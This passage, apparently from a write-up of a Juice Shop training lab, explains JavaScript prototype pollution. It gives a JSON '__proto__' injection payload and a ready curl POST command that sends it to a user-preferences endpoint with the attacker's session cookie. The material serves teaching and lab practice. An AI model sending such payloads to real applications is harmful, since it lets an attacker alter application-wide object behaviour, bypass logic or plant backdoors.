
Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which might be inherited by user-defined objects. This vulnerability let's an attacker control property of objects that would otherwise be inaccessible. 
JavaScript objects inherit from Object.prototype. Injecting into `__proto__` alters default properties application-wide, potentially bypassing logic or introducing backdoors.

To emulate this, we can send a curl request to the server using this data:
```json
{
 "__proto__": {
 "polluted": true
 }
}
```

Example command:
```bash
curl -X POST "https://SERVER_IP/api/v1/user/preferences" \ -H "Content-Type: application/json" \ -H "Cookie: session=YOUR_SESSION_COOKIE" \ -d "{\"normal_key\": \"normal_value\", \"__proto__\": {\"polluted\": true}}"
```

![Screenshot](/writeups/Cyscom%20Juice%20Shop%202025/imagedata/Picture40.png)

> [!NOTE]
> In the above request, replace SERVER\_IP with the website IP address & YOUR\_SESSION\_COOKIE with your session token. This can be found using inspect element.
